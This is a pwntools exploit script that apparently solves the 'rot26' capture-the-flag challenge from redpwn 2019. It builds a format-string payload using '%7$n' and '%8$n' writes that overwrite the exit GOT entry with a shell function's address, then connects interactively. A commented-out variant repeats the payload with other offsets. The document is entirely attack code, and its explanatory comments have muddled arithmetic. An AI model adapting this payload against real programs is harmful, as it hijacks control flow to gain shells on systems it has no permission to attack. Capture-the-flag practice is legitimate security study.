from pwn import *
import sys
# context.terminal = ['terminator', '-e']

p = process("rot26")
p = remote("chall2.2019.redpwn.net", 4003)


shell = 0x8048737
exitplt = 0x804a020

exploit = ''
exploit += p32(exitplt) #set first address to write to
exploit += p32(exitplt+2) #set second address to write to
exploit += '%34607x' #print enough character to reach shell[4:]    [ Total characters printed till now will be used as the 7th arg int(8737) => 0x34615, subtract 7 since that os automatically printed ]
exploit += '%7$n' #write number of character printed in first address
exploit += '%32973x' #print enough character to reach shell[0:4]   [ 0x10804 (overflowed) - (34607 + 8 (for the address printed)) ]
exploit += '%8$n' #write number of character printed in first address

p.sendline(exploit)
# raw_input()
p.interactive()

'''
exitplt = 0x80484a0
shell_call = 0x8048737

exploit = ''
exploit += p32(exitplt) #set first address to write to
exploit += p32(exitplt+2) #set second address to write to
exploit += '%34615x' #print enough character to reach shell[4:]
exploit += '%7$n' #write number of character printed in first address
exploit += '%32840x' #print enough character to reach shell[0:4]
exploit += '%8$n' #write number of character printed in first address
'''